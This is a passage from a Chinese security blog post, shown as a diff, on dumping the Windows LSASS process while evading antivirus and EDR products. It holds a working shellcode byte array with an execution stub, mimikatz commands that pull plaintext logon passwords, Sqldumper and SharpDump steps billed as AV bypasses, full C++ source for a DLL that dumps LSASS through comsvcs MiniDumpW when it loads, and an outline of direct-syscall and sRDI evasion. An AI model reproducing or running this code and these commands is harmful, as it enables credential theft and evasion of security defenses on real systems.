class="number">0x78</span>, <span class="number">0x64</span>, <span class="number">0x6C</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x60</span>, <span class="number">0x6E</span>, <span class="number">0x74</span>, <span class="number">0x64</span>, <span class="number">0x6C</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>,</span><br><span class="line">        <span class="number">0x24</span>, <span class="number">0x64</span>, <span class="number">0x6C</span>, <span class="number">0x2E</span>, <span class="number">0x64</span>, <span class="number">0x6C</span>, <span class="number">0x66</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x68</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>,</span><br><span class="line">        <span class="number">0x50</span>, <span class="number">0x6C</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x54</span>, <span class="number">0x73</span>, <span class="number">0x2E</span>, <span class="number">0x64</span>, <span class="number">0x6D</span>, <span class="number">0x66</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>,</span><br><span class="line">        <span class="number">0x24</span>, <span class="number">0x58</span>, <span class="number">0x70</span>, <span class="number">0x00</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x40</span>, <span class="number">0x6C</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x44</span>,</span><br><span class="line">        <span class="number">0x73</span>, <span class="number">0x2E</span>, <span class="number">0x65</span>, <span class="number">0x78</span>, <span class="number">0x66</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x48</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0xC6</span>, <span class="number">0x85</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0xE8</span>, <span class="number">0x51</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x48</span>, <span class="number">0x8D</span>, <span class="number">0x4D</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xFF</span>, <span class="number">0xD7</span>,</span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x8D</span>, <span class="number">0x4C</span>, <span class="number">0x24</span>, <span class="number">0x70</span>, <span class="number">0xFF</span>, <span class="number">0xD7</span>, <span class="number">0x48</span>, <span class="number">0x8D</span>, <span class="number">0x4C</span>, <span class="number">0x24</span>, <span class="number">0x60</span>, <span class="number">0xFF</span>, <span class="number">0xD7</span>, <span class="number">0xB9</span>, <span class="number">0x80</span>,</span><br><span class="line">        <span class="number">0x39</span>, <span class="number">0x1E</span>, <span class="number">0x92</span>, <span class="number">0xE8</span>, <span class="number">0x30</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xB9</span>, <span class="number">0xDA</span>, <span class="number">0xF6</span>, <span class="number">0xDA</span>, <span class="number">0x4F</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xF0</span>,</span><br><span class="line">        <span class="number">0xE8</span>, <span class="number">0x23</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xB9</span>, <span class="number">0x27</span>, <span class="number">0xA9</span>, <span class="number">0xE8</span>, <span class="number">0x67</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xE8</span>, <span class="number">0x16</span>, <span class="number">0xFE</span>,</span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xB9</span>, <span class="number">0x8D</span>, <span class="number">0x52</span>, <span class="number">0x01</span>, <span class="number">0xBD</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xD8</span>, <span class="number">0xE8</span>, <span class="number">0x09</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xB9</span>,</span><br><span class="line">        <span class="number">0x74</span>, <span class="number">0x71</span>, <span class="number">0x8D</span>, <span class="number">0xDC</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0xE0</span>, <span class="number">0xE8</span>, <span class="number">0xFC</span>, <span class="number">0xFD</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xB9</span>, <span class="number">0xB4</span>, <span class="number">0x73</span>, <span class="number">0x8D</span>,</span><br><span class="line">        <span class="number">0xE2</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xE8</span>, <span class="number">0xEF</span>, <span class="number">0xFD</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xB9</span>, <span class="number">0xEE</span>, <span class="number">0x95</span>, <span class="number">0xB6</span>, <span class="number">0x50</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>,</span><br><span class="line">        <span class="number">0xE8</span>, <span class="number">0xE8</span>, <span class="number">0xE2</span>, <span class="number">0xFD</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xB9</span>, <span class="number">0x64</span>, <span class="number">0xD7</span>, <span class="number">0xDE</span>, <span class="number">0x2B</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x85</span>, <span class="number">0x30</span>, <span class="number">0x01</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xE8</span>, <span class="number">0xD1</span>, <span class="number">0xFD</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xB9</span>, <span class="number">0x7A</span>, <span class="number">0x19</span>, <span class="number">0x77</span>, <span class="number">0x6A</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x45</span>, <span class="number">0x90</span>,</span><br><span class="line">        <span class="number">0xE8</span>, <span class="number">0xC3</span>, <span class="number">0xFD</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x4C</span>, <span class="number">0x8D</span>, <span class="number">0x8D</span>, <span class="number">0x28</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x8D</span>, <span class="number">0x4E</span>, <span class="number">0x14</span>,</span><br><span class="line">        <span class="number">0x45</span>, <span class="number">0x33</span>, <span class="number">0xC0</span>, <span class="number">0xB2</span>, <span class="number">0x01</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x4C</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x24</span>, <span class="number">0x30</span>, <span class="number">0x48</span>, <span class="number">0x8D</span>, <span class="number">0x4C</span>, <span class="number">0x24</span>,</span><br><span class="line">        <span class="number">0x50</span>, <span class="number">0x45</span>, <span class="number">0x33</span>, <span class="number">0xC9</span>, <span class="number">0x45</span>, <span class="number">0x33</span>, <span class="number">0xC0</span>, <span class="number">0xBA</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x28</span>,</span><br><span class="line">        <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x20</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD7</span>, <span class="number">0x33</span>, <span class="number">0xD2</span>,</span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x85</span>, <span class="number">0x38</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8D</span>, <span class="number">0x4A</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0xD6</span>, <span class="number">0x48</span>, <span class="number">0x8D</span>, <span class="number">0x55</span>, <span class="number">0xA0</span>,</span><br><span class="line">        <span class="number">0xC7</span>, <span class="number">0x45</span>, <span class="number">0xA0</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xC8</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xFF</span>, <span class="number">0xD3</span>, <span class="number">0x33</span>,</span><br><span class="line">        <span class="number">0xDB</span>, <span class="number">0x85</span>, <span class="number">0xC0</span>, <span class="number">0x74</span>, <span class="number">0x31</span>, <span class="number">0xEB</span>, <span class="number">0x1C</span>, <span class="number">0x48</span>, <span class="number">0x8D</span>, <span class="number">0x55</span>, <span class="number">0xA0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xCF</span>, <span class="number">0x41</span>, <span class="number">0xFF</span>,</span><br><span class="line">        <span class="number">0xD4</span>, <span class="number">0x48</span>, <span class="number">0x8D</span>, <span class="number">0x55</span>, <span class="number">0xCC</span>, <span class="number">0x48</span>, <span class="number">0x8D</span>, <span class="number">0x8D</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0xFF</span>, <span class="number">0xD5</span>, <span class="number">0x44</span>,</span><br><span class="line">        <span class="number">0x8B</span>, <span class="number">0x75</span>, <span class="number">0xA8</span>, <span class="number">0x48</span>, <span class="number">0x8D</span>, <span class="number">0x54</span>, <span class="number">0x24</span>, <span class="number">0x40</span>, <span class="number">0x48</span>, <span class="number">0x8D</span>, <span class="number">0x8D</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>,</span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0xD7</span>, <span class="number">0x85</span>, <span class="number">0xC0</span>, <span class="number">0x75</span>, <span class="number">0xD1</span>, <span class="number">0x45</span>, <span class="number">0x8B</span>, <span class="number">0xC6</span>, <span class="number">0x33</span>, <span class="number">0xD2</span>, <span class="number">0xB9</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x1F</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0x95</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0x85</span>, <span class="number">0x38</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x5C</span>,</span><br><span class="line">        <span class="number">0x24</span>, <span class="number">0x30</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xC8</span>, <span class="number">0x41</span>, <span class="number">0xB9</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xD6</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,</span><br><span class="line">        <span class="number">0x5C</span>, <span class="number">0x24</span>, <span class="number">0x28</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x5C</span>, <span class="number">0x24</span>, <span class="number">0x20</span>, <span class="number">0xFF</span>, <span class="number">0x55</span>, <span class="number">0x90</span>, <span class="number">0x48</span>, <span class="number">0x81</span>, <span class="number">0xC4</span>, <span class="number">0xD8</span>, <span class="number">0x01</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x5F</span>, <span class="number">0x41</span>, <span class="number">0x5E</span>, <span class="number">0x41</span>, <span class="number">0x5D</span>, <span class="number">0x41</span>, <span class="number">0x5C</span>, <span class="number">0x5F</span>, <span class="number">0x5E</span>, <span class="number">0x5B</span>, <span class="number">0x5D</span>, <span class="number">0xC3</span>, <span class="number">0xCC</span>,</span><br><span class="line">        <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xF4</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE4</span>, <span class="number">0xF0</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xEC</span>, <span class="number">0x20</span>, <span class="number">0xE8</span>, <span class="number">0xD3</span>, <span class="number">0xFD</span>, <span class="number">0xFF</span>,</span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xE6</span>, <span class="number">0x5E</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br><span class="line">     </span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    BOOL ret = VirtualProtect (shellcode, <span class="built_in">strlen</span>(shellcode), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s"</span>, <span class="string">"Error Occured"</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ((<span class="keyword">void</span>(*)(<span class="keyword">void</span>))shellcode)();</span><br><span class="line">   </span><br><span class="line">    VirtualProtect (shellcode, <span class="built_in">strlen</span>(shellcode), oldProtect, &amp;oldProtect);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>管理员权限运行dump_lsass_for_Win7_x64.exe，然后使用mimikatz加载：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass_dump.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
+<h3 id="bypass-nod32转存"><a href="#bypass-nod32转存" class="headerlink" title="bypass  nod32转存"></a>bypass  nod32转存</h3><h4 id="Sqldumper-免杀抓明文"><a href="#Sqldumper-免杀抓明文" class="headerlink" title="Sqldumper 免杀抓明文"></a>Sqldumper 免杀抓明文</h4><p>Sqldumper.exe 是从 mssql 安装目录下提取出来的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># tasklist | findstr &quot;lsass.exe&quot; 先找到 lsass.exe 进程 id </span><br><span class="line"># Sqldumper.exe 592 0 0x01100 之后,指定 id,dump 数据</span><br><span class="line"># mimikatz.exe &quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="SharpDump-C-免杀抓明文"><a href="#SharpDump-C-免杀抓明文" class="headerlink" title="SharpDump　C#免杀抓明文"></a>SharpDump　C#免杀抓明文</h4><p>用法同上，注意版本即可。,dump 的文件默认是 bin 后缀,拖到本地机器上以后,需要线把 bin 重命名为 zip 后缀,然后正常解压出里面的文件,再丢给 mimikatz 去读取即可</p>
+<p><img src="../images/lassdump/2.png" alt="image"></p>
+<h3 id="bypass-卡巴斯基转存"><a href="#bypass-卡巴斯基转存" class="headerlink" title="bypass　卡巴斯基转存"></a>bypass　卡巴斯基转存</h3><h4 id="蓝屏dump法："><a href="#蓝屏dump法：" class="headerlink" title="蓝屏dump法："></a>蓝屏dump法：</h4><p>需要的工具：WinDBG+mimilib.dll</p>
+<p>具体可参考：<a href="https://www.mrwu.red/web/2000.html" target="_blank" rel="noopener">https://www.mrwu.red/web/2000.html</a></p>
+<p>注意，动静太大，请勿轻易尝试。</p>
+<h4 id="ssp注入法："><a href="#ssp注入法：" class="headerlink" title="ssp注入法："></a>ssp注入法：</h4><p>这个办法是奇安信的师傅们给出来的，膜拜。原理不是很难懂，就是我们常用的mimikatz的misc::memssp功能，这里不再多说其原理。</p>
+<p>直接上代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;DbgHelp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"Dbghelp.lib"</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HRESULT</span><span class="params">(WINAPI* _MiniDumpW)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD arg1, DWORD arg2, PWCHAR cmdline)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* _RtlAdjustPrivilege)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    ULONG Privilege, BOOL Enable,</span></span></span><br><span class="line"><span class="function"><span class="params">    BOOL CurrentThread, PULONG Enabled)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dump</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    HRESULT             hr;</span><br><span class="line">    _MiniDumpW          MiniDumpW;</span><br><span class="line">    _RtlAdjustPrivilege RtlAdjustPrivilege;</span><br><span class="line">    ULONG               t;</span><br><span class="line"></span><br><span class="line">    MiniDumpW = (_MiniDumpW)GetProcAddress(</span><br><span class="line">        LoadLibrary(<span class="string">L"comsvcs.dll"</span>), <span class="string">"MiniDumpW"</span>);</span><br><span class="line"></span><br><span class="line">    RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(</span><br><span class="line">        GetModuleHandle(<span class="string">L"ntdll"</span>), <span class="string">"RtlAdjustPrivilege"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (MiniDumpW == <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// try enable debug privilege</span></span><br><span class="line">    RtlAdjustPrivilege(<span class="number">20</span>, TRUE, FALSE, &amp;t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">wchar_t</span>  ws[<span class="number">100</span>];</span><br><span class="line">    swprintf(ws, <span class="number">100</span>, <span class="string">L"%hs"</span>, <span class="string">"784 c:\\1.bin full"</span>); <span class="comment">//784是lsass进程的pid号  "&lt;pid&gt; &lt;dump.bin&gt; full" </span></span><br><span class="line"></span><br><span class="line">    MiniDumpW(<span class="number">0</span>, <span class="number">0</span>, ws);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (ul_reason_for_call) &#123;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">		dump();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>记得更改lsass的进程号。效果如下：</p>
+<p><img src="../images/lassdump/3.png" alt="image"></p>
+<p>剩下的就是用mimikatz加载这个bin就行了。</p>
+<h3 id="结合直接系统调用和sRDI来绕过AV-EDR"><a href="#结合直接系统调用和sRDI来绕过AV-EDR" class="headerlink" title="结合直接系统调用和sRDI来绕过AV / EDR"></a>结合直接系统调用和sRDI来绕过AV / EDR</h3><p>关于直接系统调用</p>
+<p>为了防止一个进程崩溃导致操作系统也跟着崩溃，在保护模式下引入了许多安全措施，通过虚拟内存（Virtual Memory）和权限级别（Privilege Levels），和一个叫Rings的概念，来隔离运行的不同进程之间，以及进程和操作系统之间的内存访问。</p>
+<p>Rings一共有4层，Ring0 ~ Ring3分别对应4个特权级别。</p>
+<p>Windows操作系统中实际只使用了两个特权级别：</p>
+<p>一个是Ring3层，平时我们所见到的应用程序运行在这一层，所以叫它用户层，也叫User-Mode。所以下次听到别人讲（Ring3、用户层、User-Mode）时，其实是在讲同一个概念。<br>一个是Ring0层，像操作系统内核（Kernel）这样重要的系统组件，以及设备驱动都是运行在Ring0，内核层，也叫Kernel-Mode。</p>
+<p><img src="../images/lassdump/4.png" alt="image"></p>
+<p>可以从下面截图看到模式的转换：</p>
+<p><img src="../images/lassdump/5.png" alt="image"></p>
+<p>除了这个，我们再来看一下，关于windows系统架构的一些东西：</p>
+<p><img src="../images/lassdump/6.png" alt="image"></p>
+<p>用户层的应用程序要想和底层系统交互，通常使用应用程序编程接口（Application Programming Interface ）也就是所谓的API。如果你是编写C/C++应用的Windows程序开发程序员，通常使用 Win32 API。</p>
+<p>Win32API是微软封装的一套API接口，由几个DLL（所谓的Win32子系统DLL）组成。在Win32 API下面使用的是Naitve API（ntdll.dll），这个才是真正用户层和系统底层交互的接口，一般称为用户层和内核层之间的桥梁。</p>
+<p>但是ntdll中函数大部分都没有被微软记录到官方的开发文档中，为了兼容性问题，大多数情况在写程序时，应该避免直接使用ntdll中的API。</p>
+<p>微软在Native API上面又封装一层的神奇之处正是因为Native API是用户层与内核层之间的桥梁，这样就可以在不影响Win32编程接口的情况下对系统结构进行修改。</p>
+<p>现在我们对系统调用和Windows编程API有了一些了解，让我们看看如何通过编程来绕过Win32接口层，直接调用系统API并绕过潜在的Ring3层Hook。</p>
+<p>在线查询系统调用号：<a href="https://j00ru.vexillium.org/syscalls/nt/64/" target="_blank" rel="noopener">https://j00ru.vexillium.org/syscalls/nt/64/</a>  有了这张表，我们可以直接搜索我们想要使用的Native API，就可以看到该API在不同系统中的调用号。</p>
+<p>我们需要编写汇编来调用Driect System Calls。 在Virtual Studio项目中需要启用MASM编译依赖的支持，我们才能在项目中添加.asm文件</p>
+<p>然后在VS代码中导出asm文件中定义的函数，并定义其函数原型，现在可以在我们代码中使用这些定义的System Call函数了，而不需要经过Native API这一层。</p>
+<p>当然具体的会更麻烦，不过已经有人给出来了对应的实现代码。即先卸载相关函数的Hook，然后再创建LSASS的内存转储。</p>
+<p><img src="../images/lassdump/7.png" alt="image"></p>
+<p>除了这种落地攻击，他们还利用反射型dll注入的方法，实现了直接使用cobalt strike进行获取的实现通过shinject命令注入sRDI版本的shellcode到当前进程中：</p>
+<p><img src="../images/lassdump/8.png" alt="image"></p>
+<p>注意，目前仅适用于x64版本。</p>
+<h3 id="使用comsvcs-dll进行转存"><a href="#使用comsvcs-dll进行转存" class="headerlink" title="使用comsvcs.dll进行转存"></a>使用comsvcs.dll进行转存</h3><p>关于这个的技术介绍是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">There’s a DLL called comsvcs.dll, located in C:\Windows\System32 that dumps process memory whenever they crash.</span><br><span class="line"> This DLL contains a function called MiniDumpW that is written so it can be called with rundll32.exe.</span><br></pre></td></tr></table></figure>
+<p>效果还是很不错的：</p>
+<p><img src="../images/lassdump/9.png" alt="image"></p>
+<h3 id="bypass-Cilence转存"><a href="#bypass-Cilence转存" class="headerlink" title="bypass Cilence转存"></a>bypass Cilence转存</h3><p>这个东西，我直接给出作者链接吧，因为自己本地测试没有成功，就不多说了..</p>
+<p><a href="https://github.com/hoangprod/AndrewSpecial" target="_blank" rel="noopener">https://github.com/hoangprod/AndrewSpecial</a></p>
+<p><img src="../images/lassdump/10.png" alt="image"></p>
+<h3 id="注入lsass获取密码"><a href="#注入lsass获取密码" class="headerlink" title="注入lsass获取密码"></a>注入lsass获取密码</h3><p>这个也是一样，有兴趣的可以自己试试吧</p>
+<p><a href="https://github.com/M-r-J-o-h-n/LSASS-injector" target="_blank" rel="noopener">https://github.com/M-r-J-o-h-n/LSASS-injector</a></p>
+<h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a href="https://osandamalith.com/2019/05/11/shellcode-to-dump-the-lsass-process/" target="_blank" rel="noopener">https://osandamalith.com/2019/05/11/shellcode-to-dump-the-lsass-process/</a></p>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump</a></p>
+<p><a href="http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E9%9B%B6%E4%BA%94%E8%AF%BE%EF%BC%9Awindows%20%E5%8D%95%E6%9C%BA%E5%85%8D%E6%9D%80%E6%8A%93%E6%98%8E%E6%96%87%E6%88%96hash%20%5B%E9%80%9A%E8%BF%87dump%20lsass%E8%BF%9B%E7%A8%8B%E6%95%B0%E6%8D%AE%5D.pdf" target="_blank" rel="noopener">http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E9%9B%B6%E4%BA%94%E8%AF%BE%EF%BC%9Awindows%20%E5%8D%95%E6%9C%BA%E5%85%8D%E6%9D%80%E6%8A%93%E6%98%8E%E6%96%87%E6%88%96hash%20%5B%E9%80%9A%E8%BF%87dump%20lsass%E8%BF%9B%E7%A8%8B%E6%95%B0%E6%8D%AE%5D.pdf</a></p>
+<p><a href="https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/" target="_blank" rel="noopener">https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/</a></p>
+<p><a href="https://bbs.pediy.com/thread-253564.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-253564.htm</a></p>
+<p><a href="https://book.hacktricks.xyz/windows/stealing-credentials#dumping-lsass-with-comsvcs-dll" target="_blank" rel="noopener">https://book.hacktricks.xyz/windows/stealing-credentials#dumping-lsass-with-comsvcs-dll</a></p>
+<p><a href="https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6" target="_blank" rel="noopener">https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/lassdump/">绕过杀软转存lsass进程</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2020年03月17日 - 09:03</p>
+  <p><span>最后更新:</span>2020年03月17日 - 10:03</p>
+  <p><span>原始链接:</span><a href="/lassdump/" title="绕过杀软转存lsass进程">https://lengjibo.github.io/lassdump/</a>
